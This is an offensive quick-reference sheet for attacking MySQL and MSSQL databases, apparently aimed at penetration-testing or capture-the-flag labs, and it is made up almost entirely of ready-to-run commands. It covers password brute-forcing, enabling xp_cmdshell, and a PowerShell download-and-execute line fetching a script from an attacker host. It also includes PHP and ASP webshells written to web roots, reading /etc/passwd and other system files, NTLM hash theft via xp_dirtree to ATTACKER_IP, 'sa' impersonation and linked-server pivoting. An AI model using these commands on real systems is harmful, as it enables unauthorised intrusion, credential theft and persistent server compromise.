# SQL Database Attack Quick Reference

## Default Ports
- **MySQL**: 3306 (TCP)
- **MSSQL**: 1433 (TCP), 1434 (UDP), 2433 (hidden mode)

## Enumeration

### Nmap scan
```bash
# MSSQL
nmap -Pn -sV -sC -p1433 TARGET

# MySQL
nmap -Pn -sV -sC -p3306 TARGET
```

## Authentication

### MySQL
```bash
# Connect
mysql -u username -p'password' -h TARGET

# With port
mysql -u username -p'password' -h TARGET -P 3306
```

### MSSQL (Linux)

#### sqsh
```bash
# SQL Authentication
sqsh -S TARGET -U username -P 'password' -h

# Windows Authentication
sqsh -S TARGET -U .\\username -P 'password' -h
sqsh -S TARGET -U DOMAIN\\username -P 'password' -h
```

#### impacket-mssqlclient
```bash
impacket-mssqlclient username@TARGET -p 1433
# Enter password when prompted

# Windows auth
impacket-mssqlclient DOMAIN/username@TARGET -windows-auth
```

### MSSQL (Windows)

#### sqlcmd
```cmd
sqlcmd -S SERVERNAME -U username -P 'password' -y 30 -Y 30
```

## Brute Force

```bash
# Hydra - MySQL
hydra -l username -P passwords.txt mysql://TARGET

# Hydra - MSSQL
hydra -l username -P passwords.txt mssql://TARGET

# NetExec - MSSQL
nxc mssql TARGET -u username -p passwords.txt

# Medusa - MySQL
medusa -h TARGET -u username -P passwords.txt -M mysql

# Medusa - MSSQL
medusa -h TARGET -u username -P passwords.txt -M mssql
```

## Default System Databases

### MySQL
- `mysql` - System database
- `information_schema` - Metadata
- `performance_schema` - Performance monitoring
- `sys` - Helper objects

### MSSQL
- `master` - Instance information
- `msdb` - SQL Server Agent
- `model` - Template database
- `resource` - System objects
- `tempdb` - Temporary objects

## Basic SQL Commands

### Show databases
```sql
-- MySQL
SHOW DATABASES;

-- MSSQL
SELECT name FROM master.dbo.sysdatabases;
GO
```

### Select database
```sql
-- MySQL
USE database_name;

-- MSSQL
USE database_name;
GO
```

### Show tables
```sql
-- MySQL
SHOW TABLES;

-- MSSQL
SELECT table_name FROM database_name.INFORMATION_SCHEMA.TABLES;
GO
```

### Select data
```sql
-- MySQL
SELECT * FROM users;

-- MSSQL
SELECT * FROM users;
GO
```

## Command Execution

### MSSQL - xp_cmdshell

#### Execute command
```sql
-- Check if enabled
xp_cmdshell 'whoami';
GO
```

#### Enable xp_cmdshell
```sql
EXECUTE sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO
EXECUTE sp_configure 'xp_cmdshell', 1;
GO
RECONFIGURE;
GO
```

#### Execute commands
```sql
xp_cmdshell 'whoami';
GO

xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.5/shell.ps1'')"';
GO
```

### MySQL - No direct command execution
MySQL doesn't have xp_cmdshell equivalent. Use file write + web shell.

## Write Files

### MySQL - Write webshell
```sql
-- Check secure_file_priv
SHOW VARIABLES LIKE "secure_file_priv";

-- Write PHP webshell
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/shell.php';

-- Write ASP webshell
SELECT "<%response.write(CreateObject(""WScript.Shell"").Exec(Request.QueryString(""c"")).StdOut.ReadAll())%>" INTO OUTFILE 'C:\\inetpub\\wwwroot\\shell.asp';
```

### MSSQL - Write webshell

#### Enable Ole Automation
```sql
sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO
sp_configure 'Ole Automation Procedures', 1;
GO
RECONFIGURE;
GO
```

#### Create file
```sql
DECLARE @OLE INT;
DECLARE @FileID INT;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\shell.php', 8, 1;
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
EXECUTE sp_OADestroy @FileID;
EXECUTE sp_OADestroy @OLE;
GO
```

## Read Files

### MSSQL
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;
GO

-- Read user files
SELECT * FROM OPENROWSET(BULK N'C:/Users/Administrator/Desktop/flag.txt', SINGLE_CLOB) AS Contents;
GO
```

### MySQL
```sql
SELECT LOAD_FILE("/etc/passwd");
SELECT LOAD_FILE("C:/Windows/System32/drivers/etc/hosts");
```

## Hash Stealing (MSSQL)

### Capture NTLMv2 hash

#### Start Responder/SMB server
```bash
# Responder
sudo responder -I tun0

# impacket-smbserver
sudo impacket-smbserver share ./ -smb2support
```

#### Force authentication
```sql
-- Using xp_dirtree
EXEC master..xp_dirtree '\\ATTACKER_IP\share\';
GO

-- Using xp_subdirs
EXEC master..xp_subdirs '\\ATTACKER_IP\share\';
GO
```

#### Crack hash
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

## Privilege Escalation

### MSSQL - Impersonation

#### List users we can impersonate
```sql
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
GO
```

#### Check current privileges
```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
GO
```

#### Impersonate user
```sql
-- Switch to master DB first
USE master;
GO

-- Impersonate
EXECUTE AS LOGIN = 'sa';
GO

-- Verify
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
GO
```

#### Revert to original user
```sql
REVERT;
GO
```

## Linked Servers (MSSQL)

### Enumerate linked servers
```sql
SELECT srvname, isremote FROM sysservers;
GO
```

**Values**:
- `isremote = 1` → Remote server
- `isremote = 0` → Linked server

### Execute on linked server
```sql
-- Check privileges on linked server
EXECUTE('SELECT @@servername, @@version, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [LINKED_SERVER];
GO

-- Execute commands
EXECUTE('xp_cmdshell ''whoami''') AT [LINKED_SERVER];
GO

-- Multiple commands (use semicolon)
EXECUTE('SELECT @@version; EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER];
GO
```

## Quick Attack Workflows

### Workflow 1: MSSQL RCE
```sql
-- 1. Enable xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
GO

-- 2. Execute commands
xp_cmdshell 'whoami';
GO

-- 3. Get reverse shell
xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/shell.ps1'')"';
GO
```

### Workflow 2: MySQL webshell
```sql
-- 1. Check if we can write files
SHOW VARIABLES LIKE "secure_file_priv";

-- 2. Write webshell
SELECT "<?php system($_GET['c']);?>" INTO OUTFILE '/var/www/html/shell.php';

-- 3. Access via browser
-- http://TARGET/shell.php?c=whoami
```

### Workflow 3: MSSQL hash stealing
```bash
# 1. Start listener
sudo responder -I tun0

# 2. In SQL session
EXEC master..xp_dirtree '\\ATTACKER_IP\share\';
GO

# 3. Crack hash
hashcat -m 5600 captured_hash.txt rockyou.txt
```

### Workflow 4: Privilege escalation via impersonation
```sql
-- 1. Check who we can impersonate
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
GO

-- 2. Impersonate sysadmin
USE master;
EXECUTE AS LOGIN = 'sa';
GO

-- 3. Enable xp_cmdshell and execute
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
xp_cmdshell 'whoami';
GO
```

## Common Locations for Webshells

### Windows (MSSQL)
```
C:\inetpub\wwwroot\shell.php
C:\inetpub\wwwroot\shell.asp
C:\xampp\htdocs\shell.php
```

### Linux (MySQL)
```
/var/www/html/shell.php
/var/www/html/public/shell.php
/usr/share/nginx/html/shell.php
```

## Quick Reference Table

| Task | MySQL | MSSQL |
|------|-------|-------|
| **Connect** | `mysql -u user -p -h HOST` | `impacket-mssqlclient user@HOST` |
| **Show DBs** | `SHOW DATABASES;` | `SELECT name FROM master.dbo.sysdatabases; GO` |
| **Show Tables** | `SHOW TABLES;` | `SELECT table_name FROM DB.INFORMATION_SCHEMA.TABLES; GO` |
| **Execute Cmd** | Write webshell | `xp_cmdshell 'cmd'; GO` |
| **Read File** | `SELECT LOAD_FILE('/path');` | `OPENROWSET(BULK 'path', SINGLE_CLOB); GO` |
| **Write File** | `SELECT 'data' INTO OUTFILE '/path';` | Use Ole Automation |
| **Hash Steal** | N/A | `xp_dirtree '\\\\ATTACKER\\share'; GO` |

## Notes

- **MSSQL**: Always end queries with `GO`
- **MySQL**: End queries with `;`
- **Quotes in linked servers**: Use double single quotes `''`
- **secure_file_priv**: Must be empty or set to target directory
- **xp_cmdshell**: Runs as SQL Server service account

